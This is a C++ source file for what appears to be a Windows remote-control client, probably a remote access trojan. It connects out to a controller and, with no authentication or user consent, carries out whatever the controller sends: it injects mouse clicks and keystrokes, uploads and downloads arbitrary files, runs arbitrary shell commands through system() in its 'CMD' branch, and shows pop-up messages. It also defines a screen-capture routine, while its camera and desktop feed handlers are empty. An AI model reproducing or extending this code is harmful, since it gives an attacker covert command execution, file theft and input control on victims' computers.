// basic text server.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "../WinNetlib/NetworkHandlerServer.h"
#include <thread>

#include <opencv2/opencv.hpp>

using namespace std;

NetworkHandlerServer NH;
string DesktopFeed = "Desktop Feed";
string CamFeed = "Cam Feed";

cv::Mat hwnd2mat(HWND hwnd) {

    HDC hwindowDC, hwindowCompatibleDC;

    int height, width, srcheight, srcwidth;
    HBITMAP hbwindow;
    cv::Mat src;
    BITMAPINFOHEADER  bi;

    hwindowDC = GetDC(hwnd);
    hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);

    RECT windowsize;    // get the height and width of the screen
    GetClientRect(hwnd, &windowsize);

    srcheight = windowsize.bottom;
    srcwidth = windowsize.right;
    height = windowsize.bottom;  //change this to whatever size you want to resize to
    width = windowsize.right;

    src.create(height, width, CV_8UC4);

    // create a bitmap
    hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
    bi.biSize = sizeof(BITMAPINFOHEADER);    //http://msdn.microsoft.com/en-us/library/windows/window/dd183402%28v=vs.85%29.aspx
    bi.biWidth = width;
    bi.biHeight = -height;  //this is the line that makes it draw upside down or not
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // use the previously created device context with the bitmap
    SelectObject(hwindowCompatibleDC, hbwindow);
    // copy from the window device context to the bitmap device context
    StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, 0, 0, srcwidth, srcheight, SRCCOPY); //change SRCCOPY to NOTSRCCOPY for wacky colors !
    GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);  //copy from hwindowCompatibleDC to hbwindow

    // avoid memory leak
    DeleteObject(hbwindow); DeleteDC(hwindowCompatibleDC); ReleaseDC(hwnd, hwindowDC);

    return src;
}

void rcv(NetworkHandlerServer NH) {
    DataType dt;
    cv::Mat image;
    INPUT in;



    NH.RecvTypeList();

    while (true) {
        NH.RecvDataType(dt);
        if (dt.Name == "MousePos") {
            in.type = INPUT_MOUSE;
            in.mi.dx = NH.RecvDataT<long>();
            in.mi.dy = NH.RecvDataT<long>();
            in.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
            in.mi.mouseData = 0;
            in.mi.dwExtraInfo = 0;
            in.mi.time = 0;

            //keyboard stuff
            in.ki.dwExtraInfo = NULL;
            in.ki.dwFlags = NULL;
            in.ki.time = NULL;
            in.ki.wScan = NULL;
            in.ki.wVk = NULL;

            in.hi.uMsg = NULL;
            in.hi.wParamH = NULL;
            in.hi.wParamL = NULL;
            //keyboard stuff

            SendInput(1, &in, sizeof(INPUT));

        }
        else if (dt.Name == "MouseDown") {
            int clickType = NH.RecvDataT<int>();
            if (clickType == 1) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 2) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 3) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }


        }
        else if (dt.Name == "MouseUp") {
            int clickType = NH.RecvDataT<int>();
            if (clickType == 1) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 2) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
            else if (clickType == 3) {
                in.type = INPUT_MOUSE;
                in.mi.dx = 0;
                in.mi.dy = 0;
                in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
                in.mi.mouseData = 0;
                in.mi.dwExtraInfo = 0;
                in.mi.time = 0;

                //keyboard stuff
                in.ki.dwExtraInfo = NULL;
                in.ki.dwFlags = NULL;
                in.ki.time = NULL;
                in.ki.wScan = NULL;
                in.ki.wVk = NULL;

                in.hi.uMsg = NULL;
                in.hi.wParamH = NULL;
                in.hi.wParamL = NULL;
                //keyboard stuff

                SendInput(1, &in, sizeof(INPUT));
            }
        }
        else if (dt.Name == "KeyDown") {
            // Set up a generic keyboard event.
            in.type = INPUT_KEYBOARD;
            in.ki.wScan = 0; // hardware scan code for key
            in.ki.time = 0;
            in.ki.dwExtraInfo = 0;

            // Press the "A" key
            in.ki.wVk = NH.RecvDataT<WORD>();; // virtual-key code for the "a" key
            in.ki.dwFlags = 0; // 0 for key press
            SendInput(1, &in, sizeof(INPUT));

        }
        else if (dt.Name == "KeyUp") {
            // Set up a generic keyboard event.
            in.type = INPUT_KEYBOARD;
            in.ki.wScan = 0; // hardware scan code for key
            in.ki.time = 0;
            in.ki.dwExtraInfo = 0;

            // Press the "A" key
            in.ki.wVk = NH.RecvDataT<WORD>();; // virtual-key code for the "a" key
            in.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
            SendInput(1, &in, sizeof(INPUT));
        }
        else if (dt.Name == "SendFILE") {
            std::string path = NH.RecvDataT<std::string>();
            NH.RecvFile(path);
        }
        else if (dt.Name == "RecvFILE") {
            std::string path = NH.RecvDataT<std::string>();
            NH.SendFile(path, 10000);
        }
        else if (dt.Name == "CMD") {
            string command = NH.RecvDataT<std::string>();
            system(command.c_str());
        }
        else if (dt.Name == "DataTypeList") {
            NH.RecvTypeList();
        }
        else if (dt.Name == "DesktopIMG")
        {
            //send desktop image

        }
        else if (dt.Name == "CamIMG") {
            //send cam image
        }
        else if (dt.Name == "RecvPopUp") {

            string Title = NH.RecvDataT<string>();

            string Msg = NH.RecvDataT<string>();

            MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONEXCLAMATION);

        }
        else if (dt.Name == "RecvPopUpYN") {
            string Title = NH.RecvDataT<string>();

            string Msg = NH.RecvDataT<string>();

            int awnser = MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONQUESTION | MB_YESNO);

            switch (awnser)
            {
            case IDYES:
                NH.SendDataT<int>(1);
                break;
            case IDNO:
                NH.SendDataT<int>(0);
                break;
            }
        }

    }
}


int main()
{

    thread recvThread;


    if (NH.DefaultInitConnect()) {
        recvThread = thread(rcv, NH);
        //system("pause");
    }

    recvThread.join();
    return 0;
}